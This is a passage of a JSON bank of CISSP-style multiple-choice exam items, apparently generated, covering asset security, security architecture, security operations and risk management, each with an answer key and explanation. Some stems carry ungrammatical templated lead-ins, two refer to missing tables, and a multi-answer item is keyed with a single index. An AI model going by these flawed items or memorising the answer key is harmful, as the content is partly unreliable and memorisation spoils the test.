      "explanation": "Option 1 is correct in this scenario. The illustration above represents a staff gaining access to data. Administrators are responsible for giving personnel access to data. Options B and C represent other data roles. User refers to any individual who utilizes a computing system to gain access to data to accomplish a certain role. Data processors refer to any system that can be utilized in processing data. Option 4 is less suitable since data sharing is not a data role."
    },
    {
      "id": "d2-q67",
      "domain": "2. Asset Security",
      "stem": "As part of a risk reduction initiative, an individual is purchasing some items on an e-commerce platform using their credit card. The state of data involved in the transaction can be described as ______?",
      "choices": [
        "Data in use",
        "Data at rest",
        "Data in transit",
        "Both data at rest and in transit"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Data in part of an e-commerce transaction can be classified as data in transit since it's moving between the parties involved. For example, when making an online payment using a credit card, the payment information is transferred from the buyer to the e-commerce system. Option 1 is less suitable because data in use refers to data that is currently being processed by a computing system. Option 2 is less suitable because data at rest is data that is not active and is stored physically. Option 4 is less suitable since data at rest is not involved in the transaction."
    },
    {
      "id": "d3-q84",
      "domain": "3. Security Architecture and Engineering",
      "stem": "In a recent internal assessment, a regional hospital network is required to enforce access controls to make sure that users do not gain access as per their earlier activity. For instance, after a consultant has accessed data owned by one of their clients, they may not have access to any data belonging to that client's competitors. The security model that matches this need is___________?",
      "choices": [
        "Brewer - Nash",
        "Bell-LaPadula",
        "Biba",
        "Clark-Wilson"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Brewer–Nash is a security model in which access controls can undergo dynamic changes depending on the actions of the user. This model is often applied in scenarios that are similar to those in the above scenario to enforce a \"Chinese wall\" that ensures a subject does not access data from various clients of similar interests. Options 2, 3, and 4 are also security models but cannot be applied in this environment. With the Bell-LaPadula Model, every subject is assigned a security clearance level, while a security level is assigned to each object. The Biba Model makes it hard to modify data by employing two properties: an integrity property and a simple integrity property. The Clark-Wilson Model ensures that a subject uses a program to access an object"
    },
    {
      "id": "d3-q85",
      "domain": "3. Security Architecture and Engineering",
      "stem": "In a recent internal assessment, a manufacturing organization to improve the security of their systems. They have opted to apply the Process for Attack Simulation and Threat Analysis (PASTA) methodology, which follows a seven-step approach to identify the potential threats and vulnerabilities to a system and the available countermeasures. Using this methodology, what should the employee do first?",
      "choices": [
        "Analyze risks and management",
        "Define the objectives for the risk analysis",
        "Analyze strengths",
        "Define the technical scope"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. The PASTA (Process for Attack Simulation and Threat Analysis) methodology has seven steps. The first step is focused on the definition of objectives. Option 1 is less suitable because risk and impact analysis is the last step. Option 3 is less suitable because analyzing strengths is not one of the steps in the PASTA methodology. Option 4 is less suitable because the definition of technical scope is the second step. The third PASTA step involves decomposing and analyzing the application, the fourth step is threat analysis, the fifth step involves analyzing vulnerabilities and weaknesses, and the sixth step is analyzing modeling and simulation."
    },
    {
      "id": "d1-q119",
      "domain": "1. Security and Risk Management",
      "stem": "During a security governance meeting, you work as a CISO in an enterprise. The organization wants to purchase new computers and some software for their new branch. You have been tasked with conducting a security assessment of potential vendors that have shown interest in supplying the products. What option is NOT part of the process you will complete to determine the right vendor?",
      "choices": [
        "Ask the vendor to provide a third-party audit report.",
        "Plan a visit to the vendor’s offices. While there, pose some questions to the managers and employees regarding their security policies.",
        "Review the vendor's catalogs and compare prices to determine which vendor offers the best price.",
        "Review the vendor's documents, such as operating documentation, baselines, standards, and policies."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Before the procurement department purchases new products, it should first ensure that the vendor is an entity that can be trusted. This can be done through a security assessment of various vendors that have shown interest in doing business with your organization before final selection. Security assessment of vendors may include reviewing the vendor's third-party audit report (1), which must be based on a framework that resonates with the organization's objectives. The CISO may also pay a surprise site visit to the vendor's premises (2) in order to gain firsthand experience with their operation (to determine whether they adhere to security policies, for example). The vendor's operating documents, such as operating documentation, baseline, standards, and policies (4), can also be checked to find out whether they have aligned with security best practices. However, comparing vendors' prices and catalogs (3) is not part of the security assessment."
    },
    {
      "id": "d5-q85",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "During a security governance meeting, an organization hosts part of its server within the enterprise's data center and the rest in the cloud. Can they apply Identity as a Service (IdaaS) to support identity needs?",
      "choices": [
        "Yes",
        "No"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Identity as a Service can be used by any system. The identity verification not have to originate from within a 'cloud' to be answered by the cloud."
    },
    {
      "id": "d6-q92",
      "domain": "6. Security Assessment and Testing",
      "stem": "In a recent internal assessment, an employee is scanning a network port of a web server used in his business. They are using an external network to run the scan because they want to get the perspective of a hacker. What option results should worry them?",
      "choices": [
        "1433/open",
        "443/open",
        "22/filtered",
        "80/open"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. An open port is a sign of a looming security risk (risk indicator). Port 1433 is never expected to be open since it is a database port and is not required to have any exposure to an external network. The only ports that should be open on the web server are ports 443 and 80. So, there is no need to worry if these are open. Therefore, options 2 and 4 are incorrect. Option 3 is less suitable since it indicates that some filtering may be taking place on the port, so you can’t use it at the moment."
    },
    {
      "id": "d6-q93",
      "domain": "6. Security Assessment and Testing",
      "stem": "An ethical hacker in a medium-sized corporation has been tasked with assessing the security of the corporation's systems and prepare a penetration test report. What option information is not necessary for the report?",
      "choices": [
        "Ways of dealing with any issue discovered",
        "Ratings for any identified vulnerabilities",
        "Any sensitive information gathered during the testing",
        "All identified issues"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. A penetration testing report does not usually include sensitive information gathered during the assessment since the data might be accessed by readers who are not authorized to access it, and when the report is exposed, it could land the organization at more risk. Remediation strategies of discovered issues, ratings of the vulnerabilities, and a list of the discovered vulnerabilities are all common components of a penetration test report. Therefore, options 1, 2, and 4 are incorrect."
    },
    {
      "id": "d6-q94",
      "domain": "6. Security Assessment and Testing",
      "stem": "During a security governance meeting, a manufacturing organization choose audit standards that the organization will adhere to in all its branches. What option IT standards are they not likely to suggest?",
      "choices": [
        "ISO/IEC (International Standards Organization/International Electrotechnical Committee) 27002",
        "COBIT",
        "Statement of Standards for Attestations Engagement (SSAE)-16",
        "ITIL"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. ITIL, initially referred to as IT Infrastructure Library, is not applied in auditing; it is a set of IT management practices. ISO/IEC 27002, COBIT (Control Objectives for Information and Related Technology), as well as SSAE–16 (The Statement on Standards for Attestation Engagements number 16 form part of IT standards utilized in auditing."
    },
    {
      "id": "d7-q85",
      "domain": "7. Security Operations",
      "stem": "During a security governance meeting, ___________evidence is made of tangible items that may be presented in a court of law during a judicial proceeding?",
      "choices": [
        "Testimonial",
        "Real",
        "Beyond reasonable doubt",
        "Documentary"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Items that may be brought before a court of law are referred to as real evidence. They may include biometric devices, weapons, or hard disks. Option 1 is less suitable since testimonial evidence is evidence presented by word of mouth. Option 3 is less suitable because beyond reasonable doubt refers to a standard of proof and not a type of evidence. Option 4 is a type of evidence that refers to written items that may not be in physical form."
    },
    {
      "id": "d7-q86",
      "domain": "7. Security Operations",
      "stem": "What option is NOT a basic preventive measure that an organization can implement to ensure the security of their applications and systems?",
      "choices": [
        "Run forensic imaging of the entirety of their systems and applications.",
        "Get rid of accounts and services that are not required.",
        "Ensure that updated patch levels are maintained in all their applications and operating systems.",
        "Enforce a system to detect and prevent intrusion."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Forensic imaging is not a part of preventive measures. Instead, this is performed in the process of responding to an incident. Removing accounts and services that are not in use, maintaining updated patch levels, and enforcing a system that can detect and prevent intrusions are all primary preventive measures."
    },
    {
      "id": "d7-q87",
      "domain": "7. Security Operations",
      "stem": "As part of a risk reduction initiative, the systems administrator for a bank has been tasked with the responsibility of enforcing a new security principle that will grant employees administrative privileges within the banking system. They have designed the process in such a manner that employees will require approval from the bank's Chief Financial Officer and the General Manager to access the system. Which security mechanism has the CISO implemented?",
      "choices": [
        "Job rotation",
        "Need-to-know",
        "Mandatory vacations",
        "Two-man rule"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. In this case, the CISO has developed a mechanism that requires the approval of two individuals before a sensitive action can be executed. The principle is referred to as the two-man rule or two-person control. Option 1 is less suitable because job rotation (also known as the rotation of duties) allows employees to rotate through various job responsibilities as a way of cross-training and ensuring minimal fraud. Option 2 is less suitable because need-to-know is a principle that ensures that employees can only access resources that are required to accomplish their specific job roles. Option 3 is less suitable because mandatory vacation refers to a process wherein an employee is subjected to a compulsory vacation of about one or two weeks to give space for peer review or fraud detection."
    },
    {
      "id": "d7-q88",
      "domain": "7. Security Operations",
      "stem": "Your organization has some computers that have reached the end of their lifecycle and you want to donate them to the nearest public library where they will still be useful. What should you do before giving away the computers?",
      "choices": [
        "Install the computer's original software",
        "Sanitize the computers",
        "Withdraw the software licenses",
        "Get out all the DVDs and CDs from the computer"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. After reaching the end of their lifecycle, all systems need to be sanitized to remove all sensitive information. Option 1 is less suitable because the installation of the original software of a computer is not a necessity unless it forms part of an organization's sanitization requirements. Option 3 is less suitable because withdrawal is also unnecessary in sanitization. Option 4 is less suitable because the removal of DVDs or CDs from a computer is just a portion of sanitization, which should be accompanied by checking other elements to make sure no data is left behind."
    },
    {
      "id": "d7-q89",
      "domain": "7. Security Operations",
      "stem": "During a security governance meeting, a SaaS provider wants to deploy a deliberate false loophole that can be used to trap intruders in their systems. What option can they utilize to achieve this?",
      "choices": [
        "Darknet",
        "Warning banner",
        "Pseudoflaw",
        "Honeynet"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Pseudoflaws refer to loopholes or false vulnerabilities that are created intentionally with the aim of tempting attackers. Option 1 is less suitable because a darknet refers to a portion of network address space that is idle without network activity and can be utilized in spying on any unauthorized activity. Option 2 is less suitable because a warning banner refers to a legal device that plays the role of alerting attackers that they do not have permission to log into a system. Option 4 is less suitable because a honeynet is a chain of several honeypots that work together to simulate a system."
    },
    {
      "id": "d7-q90",
      "domain": "7. Security Operations",
      "stem": "In a recent internal assessment, a government agency receives complaints from employees about a network issue; they decide to troubleshoot it and discover that the problem is the result of a closed port. After opening the port, the issue is resolved. Later, an attacker is able to hack their systems after accessing that port. Which management process was the technician supposed to follow to avoid such an incident?",
      "choices": [
        "Change management process",
        "Vulnerability management process",
        "Patch management process",
        "Configuration management process"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. The technician was supposed to adhere to the change management process by first evaluating the change, then implementing it. This helps avoid unforeseen system failure or the weakening of security. Option 2 is less suitable because the vulnerability management process ensures systems are not subjected to common or known vulnerabilities. Option 3 is less suitable because the patch management process checks that the systems are updated. Option 4 is less suitable because the configuration management process makes sure that the deployed systems are similar. Apart from change management, the remaining processes cannot stop unauthorized changes."
    },
    {
      "id": "d7-q91",
      "domain": "7. Security Operations",
      "stem": "As part of a risk reduction initiative, an employee is responsible for backing up their enterprise's main file server. According to their backup plan, full backups are performed every Wednesday at 11:00 pm, while differential backups happen at similar times during all other days. The table below shows how the files change. With reference to the information on the table, how many files will be copied during Friday's backup?",
      "choices": [
        "Six",
        "Five",
        "Three",
        "Two"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. According to the schedule, every file on the server will be backed up on Wednesday evening's full backup. Then, during Friday's differential backup, any file modified and created since the previous full backup will be copied. There are five of these files: files A, B, C, E, and F."
    },
    {
      "id": "d7-q92",
      "domain": "7. Security Operations",
      "stem": "What option disaster recovery tests involves team members walking through a scenario but no alterations are made to the information systems?",
      "choices": [
        "Full interruption test",
        "Checklist review",
        "Parallel test",
        "Tabletop exercise"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. A tabletop exercise refers to a disaster recovery test where team members are brought together to walk through a scenario. However, no change is made to the information systems. Option 1 is less suitable because full interruption is where team members take down the main site and give an assurance that the site used for disaster recovery has the capacity to host regular operations. Option 2 is less suitable because checklist review involves a process wherein team members are given their disaster recovery checklist content to review on their own and propose changes in case any are needed. This type of test causes the least disruptions. Option 3 is less suitable because the parallel test involves the activation of an alternative site for disaster recovery testing, while the main site remains functional."
    },
    {
      "id": "d3-q86",
      "domain": "3. Security Architecture and Engineering",
      "stem": "Bina works as SOC lead in a local bank. She has proposed to the bank manager that they need to hash all the messages sent to their customers to ensure the messages remain authentic. The bank manager has requested that Bina share some features of hashing algorithms with them before they approve the proposal. What option are characteristics of a hashing algorithm? Choose ALL answers that apply?",
      "choices": [
        "A hashing algorithm takes variable-length input.",
        "Getting two messages that share the same hash value is almost impossible.",
        "A hashing algorithm can be reversed.",
        "A hashing algorithm requires a cryptographic key."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 1 and 2. Hash functions take a variable-length input, and it's almost impossible to have two messages with a common value in hash functions. 3 is incorrect because the hashing algorithm cannot be reversed. Option 4 is less suitable because there is no secrecy attribute within hash functions, so they do not need a cryptographic key."
    },
    {
      "id": "d3-q87",
      "domain": "3. Security Architecture and Engineering",
      "stem": "After a control-gap review, jayesh works as a security facility officer in a bank. As part of security measures, he has decided to educate the other employees on methods of suppressing the different classes of fire in case of an emergency. He has prepared a table showing the different fire classes and methods of suppressing them. However, two classes and their corresponding methods in the table are incorrect. Which two fire classes and their suppression methods does Jayesh have to correct before sharing the information with employees?",
      "choices": [
        "Classes A and B",
        "Classes C and D",
        "Classes A and C",
        "Classes C and K"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Fire classes are classified as classes A, B, C, D, and K. It is critical to know the types of fire and how to fight each of them. Class A fires contain common combustible materials such as paper, cloth, or wood. Such a fire should be extinguished using soda acid or water, not gas. Class C fires have some electrical element such as a computer or any other equipment that uses electricity to run. This type of fire should be suppressed using a gas such as CO2. Options 1, 2, and 4 are not correct answers because fire classes B, D, and K are correctly matched with their methods of suppression."
    },
    {
      "id": "d7-q93",
      "domain": "7. Security Operations",
      "stem": "Hideo has been assigned the responsibility to assess and augment the physical security of his business. What option approaches and controls should he apply to ensure proper enforcement?",
      "choices": [
        "Layered facility access controls",
        "External boundary controls",
        "Personnel access controls",
        "Physical facility access controls"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Enforcement of physical security can only be achieved by applying a defense-in-depth mechanism using layered defenses. The assumption should be that a dedicated hacker will have a strategy to compromise any particular control, so there is a need to have compensating controls which will equip the defender with the ability to thwart any breach. Option 2 is less suitable because, despite being a critical first layer of defense, people are granted access through them intentionally. They can easily be bypassed by an attacker. Option 3 is less suitable because, just like mechanical and physical locks, defeating of personnel access controls is also easy. Trained hackers can easily spoof biometric systems, clone smart badges, or forge ID badges. Option 4 is less suitable because, without considering the security level or \"grade\" offered by a physical lock, a knowledgeable attacker can bypass a device or mechanical lock."
    },
    {
      "id": "d7-q94",
      "domain": "7. Security Operations",
      "stem": "During a quarterly audit, afsana works as a security officer in a local bank. She has been asked to teach a group of new employees how to comply with the bank's security policy as they perform their day-to-day tasks. This event is called ____________?",
      "choices": [
        "Education",
        "Awareness",
        "Training",
        "Termination"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Training refers to teaching personnel how to carry out their job responsibilities (in this case, as they adhere to the security policy of a company). Organizations often host training that targets employees who share common job responsibilities. Also, it is critical to train new staff to ensure they comply with an organization's procedures, guidelines, and the standards stipulated by the security policy. Option 1 is less suitable because education refers to a process that seeks to teach users (as opposed to employees) in greater scope and detail what they need to know for a given subject, and may include theory and instruction beyond job tasks and requirements. Option 2 is less suitable because awareness is a process that establishes the minimum standard/common denominator or understanding of security. Option 4 is less suitable because termination refers to a process whereby an employee's service to an organization comes to an end."
    },
    {
      "id": "d8-q65",
      "domain": "8. Software Development Security",
      "stem": "Meera is a software developer in an organization that sells toys online. She has been tasked with the responsibility of developing software that will ease how customers make their payments. If Meera decides to apply the waterfall model of software development, which of the following answers shows the steps she will follow from first to last?",
      "choices": [
        "Design, Requirements, Testing, Coding, Maintenance",
        "Design, Requirements, Coding, Testing, Maintenance",
        "Requirements, Design, Coding, Testing, Maintenance",
        "Requirements, Design, Testing, Coding, Maintenance"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. The five steps followed in the waterfall model software development process are Requirements, Design, Coding, Testing, and Maintenance. Option 1 is less suitable because apart from maintenance, the other steps are not correct. Option 2 is less suitable because the Requirements and Design steps have been interchanged. Option 4 is less suitable because the Coding and Testing steps have been interchanged."
    },
    {
      "id": "d1-q120",
      "domain": "1. Security and Risk Management",
      "stem": "During a quarterly audit, ransomware and Malware affect which of the following principles of security the most respectively?",
      "choices": [
        "Confidentiality and Availability",
        "Integrity and Confidentiality",
        "Availability and Integrity",
        "Confidentiality and Non-Repudiation"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. Ransomware primarily impacts the availability of the data and may also affect the integrity of the data. Malware on the other hand primarily affects the integrity of the data. Confidentiality is affected when one tries to extract information that is not intended for that individual, for example - eavesdropping, network monitoring, shoulder surfing, Sniffing, etc Non-Repudiation is the principle of associating actions with a unique individual, such that we can clearly prove that the action is performed by the involved party. This is generally done via Digital Signatures, Authentication, logging, etc."
    },
    {
      "id": "d1-q121",
      "domain": "1. Security and Risk Management",
      "stem": "Your organization has hired a new Security Architect who has experience with products from a particular vendor and is therefore inclined to use their suite of products. She suggests your team replaces the existing tools with the products of her chosen vendor. What is the primary concept missing from this action?",
      "choices": [
        "Risk Assessment",
        "Due Diligence",
        "Due Care",
        "Strategic Alignment"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. The primary goal of a security professional is to achieve the fundamental objectives of Confidentiality, Integrity, and Availability while supporting the organization's objective – Strategic Alignment. The inclusion or replacement of products should not be driven by emotions or preference but rather be based on Risk Assessment and Due Diligence. Other objectives include Value Delivery, Customer Satisfaction, and Reduced Liability. The above preference-based decision seems to be distant from all the aforementioned objectives. All the decisions must be strategically aligned with the Organization's Goals. Risk Assessment (1) is the crucial step involved while making any security decision, however, it is still a component of Strategic Alignment (4). Same is the case with due dilligence (2) and due care (3)."
    },
    {
      "id": "d1-q122",
      "domain": "1. Security and Risk Management",
      "stem": "After a control-gap review, the Stuxnet (2010) Advance Persistent Threat (APT) impacted specialized hardware equipment and included many zero-day attacks. What is the best way to safeguard enterprises against such attacks?",
      "choices": [
        "Define Security Policies that ensure defense in depth",
        "Deploy IDS/IPS, Firewalls with strict ingress/egress rules",
        "Classify the Organization's infrastructure and apply appropriate safeguards based on the criticality",
        "Perform Risk Management and define safeguards accordingly"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Zero-day vulnerabilities are unknown to the vendor and hence there is no fix to the vulnerability of system/software/control. The best way to deal with zero-day vulnerabilities is to have clearly defined Security Policies that ensure defense in depth. Security Policies define the asset classifications (3), based on which the criticality of assets is evaluated and a cost-benefit analysis is done (4). Based on the Risk Analysis, specific controls are defined (2)."
    },
    {
      "id": "d1-q123",
      "domain": "1. Security and Risk Management",
      "stem": "Which is the most applicable set of regulations to your enterprise, given that your organization is a payment service provider?",
      "choices": [
        "Payment Card Industry- Data Security Standard (PCI-DSS)",
        "Local Regulations based on the Jurisdiction",
        "Health Information Portability and Accountability Act (HIPAA)",
        "The Payment Service Regulations"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. \"Think Global, Act Local\"; with regulations, you need to adhere to the local jurisdictions, these are always most applicable to your organization. Option 1 is less suitable because, while PCI-DSS (Payment Card Industry Data Security Standard) is a Payment Service Provider contractual requirement, and meeting this will help you protect your data and customers' information from breaches and theft, the question asks about the most applicable regulations. These will always be the local regulations applicable to your business (2). Option 3 is less suitable because HIPAA(Health Information Portability and Accountability Act) is a series of federal regulatory standards that outline the lawful use and disclosure of protected health information in the United States, and are therefore not the most applicable to your organization. Similarly, D, the Payment Service Regulations 2017, is not correct as these set out the rules relating to all 'payment services' including the services provided by banks, building societies, and debit card providers in the UK."
    },
    {
      "id": "d1-q124",
      "domain": "1. Security and Risk Management",
      "stem": "In a recent internal assessment, you identify a security error in which the firewall is restarted several times during the course of a given period of time. While the firewall is down (between restarts), it allows traffic into the organization which is otherwise denied by default. What type of investigation are you most likely to perform as a Security Consultant?",
      "choices": [
        "Criminal",
        "Administrative",
        "Civil",
        "Regulatory"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. Administrative/Organizational investigation has the least burden of proof as the intention of the investigation is to identify the root cause behind the issue and to make sure the issue does not happen again. option 1 is not correct as a criminal Investigation has the highest burden of proof (\"Beyond a reasonable doubt\") as once the culprit is identified and proven, this could lead to imprisonment and/or fines. Option 3 is not correct as a civil Investigation has a lesser burden of proof than a criminal investigation, but still greater than administrative (it requires a \"Preponderance of Evidence\"). Examples of Civil cases are Intellectual Property Violations or events/practices that may violate an individual's or organization's legal rights. Civil cases generally lead to compensating the victim (monetary fines or the abolishment of practices that led to the case). Option 4 is not correct as regulatory investigations often take the form of external, mandatory audits, and are focused on evaluating security controls and compliance. A Regulatory investigation may take the form of an organizational investigation, civil investigation, or criminal investigation depending upon the type of incident. Regulatory investigations are conducted by a regulating body, against an organization suspected of a violation."
    },
    {
      "id": "d1-q125",
      "domain": "1. Security and Risk Management",
      "stem": "What is the best way to safeguard your organization against the use of external storage devices by employees/business partners who have access to the organizational resources?",
      "choices": [
        "Install Intrusion Detection/Prevention Software",
        "Disable the USB Ports on all the machines",
        "Install third party tools which detect and block the use of external storage devices",
        "Define Security Policy, standards, procedures, and guidelines against the use of external devices"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. The best way to safeguard against any threat is to define the action plan and the set of rules, policies, standards, procedures, and guidelines to make sure that you have addressed the issue. Once these are defined depending upon the Risk Assessment, the appropriate controls are identified and placed to reduce the risk. CISSP requires you to think like a manager, not solve the issue. Other options require you to fix the problem."
    },
    {
      "id": "d1-q126",
      "domain": "1. Security and Risk Management",
      "stem": "In a recent internal assessment, recent Security Reports show that many developers are using free cloud-based tools like data formatters, data parsers, convertors, and comparators. They copy the enterprise's code into these tools instead of using the enterprise's provided tool to process the data. What option agreements is most likely to be violated?",
      "choices": [
        "Acceptable Use Policy",
        "Non-Disclosure Agreement",
        "Non-Compete Agreement",
        "Employment Contract"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. Acceptable Use Policy (AUP) provides your employees with an understanding of how they are expected to use the organization's resources. This involves Internet Usage Policy, Work from Home Policy, and Endpoint Security Policy. The policy helps to protect both the organization and the employee. The employee will be aware that browsing certain sites and downloading certain files is prohibited and that the policy must be adhered to or there could be serious repercussions, thus leading to fewer security risks for the business as a result of employee negligence. The policy outlines the Do's and Don'ts along with the penalties in case of violation. The AUP helps to ensure that the employees understand the organization's policy and prohibits intentional or unintentional sensitive data leakage through internet tools. A Non-Disclosure Agreement (2) prohibits sharing of organizational data with third parties. It is a legal contract between at least two parties that outlines confidential material, knowledge, or information that the parties wish to share with one another for certain purposes but wish to restrict access to. Examples of violations of NDAs include telling friends or family members about the protected material, releasing company information to the press or to the consumer public, releasing photos, videos, or audio recordings of the sensitive material, or informing competing businesses about the company's plans. NDAs apply to the employee even after the employee leaves the organization. In Non-Compete Agreements (3), the Employee specifically agrees that for a period of X [months/years] after the Employee is no longer employed by the Company, the Employee will not engage, directly or indirectly, either as proprietor, stockholder, partner, officer, employee or otherwise, in the same or similar activities as were performed for the Company in any business. Examples of breaches of Employee Contracts (4) include breach of the Organization's AUP, NDA, NCA (if applicable), breaking any restraints of trade clauses in the employment contract, such as going to work for a competitor when your contract doesn't allow it, taking your client contact list with you when you leave, and quitting without giving proper notice as per your contract."
    },
    {
      "id": "d1-q127",
      "domain": "1. Security and Risk Management",
      "stem": "You are asked to initiate a Threat Modeling exercise within your enterprise. Since this is the first time the organization is doing this, what will be the next step after identifying the objective for the Threat Modeling exercise?",
      "choices": [
        "Identify Threats",
        "Identify Vulnerabilities",
        "Identify Risks",
        "Identify Assets"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. Threat modeling enables you to perform a proactive cybersecurity threat assessment. Security teams use threat modeling insights to evaluate risks and prioritize mitigation. Threat modeling can help security teams prioritize threats, ensuring that resources and controls are applied effectively. After the organization has determined the objective of the Threat Modelling exercise, the next step will be to identify the assets that are valuable to the organization. Typical next steps of threat modeling are identifying threats, architecture analysis to determine potential attacks, reduction analysis, prioritization, and response."
    },
    {
      "id": "d2-q68",
      "domain": "2. Asset Security",
      "stem": "As part of a risk reduction initiative, your organization has initiated a knowledge campaign to provide free courses to all. What option data classification categories relates most closely to the course content?",
      "choices": [
        "Confidential",
        "Private",
        "Sensitive",
        "Public"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct in this scenario. The above scenario corresponds to the Private/Business Sector. The course content, however, corresponds to information that is publicly available to everyone. Organizations generally maintain the integrity of public information. Though free, this is still the Intellectual Property of the Organization. Confidential (1) is a classification used for data that is extremely sensitive and for internal use only. A significant negative impact could occur for a company if confidential data is disclosed. Confidential data is sometimes labeled as proprietary. If proprietary data is disclosed, it can have drastic effects on the competitive edge of an organization. Private (2) is a classification used for data that is of a private or personal nature and intended for internal use only. If disclosed a significant negative impact could occur for the company/individuals. Sensitive (3) is the classification given to data that should not be available to everyone (like public data) but which isn't private or confidential. A negative impact could occur on the company if sensitive data is disclosed. An example of Sensitive Data is Internal Network Design, Software used, etc."
    },
    {
      "id": "d2-q69",
      "domain": "2. Asset Security",
      "stem": "Your organization follows strict data classification policies and marks all sensitive and critical systems with appropriate data classification. However, you find that the organization does not mark or label the non-confidential components. What is the issue with this approach?",
      "choices": [
        "Unlabelled data intrinsically means unclassified information",
        "No Retention Policy is applied to the unlabelled data",
        "Unlabelled data could lead to mishandling",
        "All of the above"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct in this scenario. When you do not label the data and/or systems with appropriate classifications, you won't be sure of the kind of data you are dealing with. This can lead to mishandling of the data. All the Data Handling Policies, Data Archiving, and Data Retention Policies are defined based on the data classification. It is therefore crucial to label all the data/systems with the appropriate level of classification."
    },
    {
      "id": "d2-q70",
      "domain": "2. Asset Security",
      "stem": "During a recent Cloud Initiative, your organization unit decided to move the financial reports to the Private Cloud environment. The Cloud Service Provider provides additional multiple layers of security via Mutual Certificate Authentication and Industry-level encryption. Given the additional features provided by the Cloud Service Provider, what level of protection should be applied to the financial reports?",
      "choices": [
        "The same level of protection as on-premises",
        "A higher level of protection than on-premises",
        "Less protection due to CSP default features",
        "No additional protection due to CSP default features"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct in this scenario. The level of protection applied to the data should be determined by Data Classification. For example, confidential data should be protected based on how it is mentioned in the organization's policy on safeguarding confidential information. The data must be protected with the same level of protection be it on-premises or cloud."
    },
    {
      "id": "d2-q71",
      "domain": "2. Asset Security",
      "stem": "In a recent internal assessment, recently, one of your highly critical systems failed. Thankfully due to High Availability, the organization was not significantly impacted. The Root Cause Analysis pointed out that the server's hard disk had failed. You have outsourced the hardware management to a third-party vendor, and they have already provided you with a replacement and taken away the damaged one. What is the potential issue with this?",
      "choices": [
        "Since the server is critical, third-party vendors should not have been involved",
        "Mishandling of Organizational Data remnants in the HDD by the vendor",
        "Health checks of other systems in the HA infrastructure will not be checked",
        "No issue with the process."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct in this scenario. A damaged HDD can be used to recover critical organizational data. Before handing over the damaged system to the vendor, the existing hardware should be sanitized based on the organization's Security Policies. Without this step, there is potential for mishandling of the organization's critical data by the vendor."
    },
    {
      "id": "d2-q72",
      "domain": "2. Asset Security",
      "stem": "What option factors is least considered when establishing an enterprise's Data Retention Policy?",
      "choices": [
        "Litigation Obligations",
        "Business Needs",
        "Data Source",
        "Regulations"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
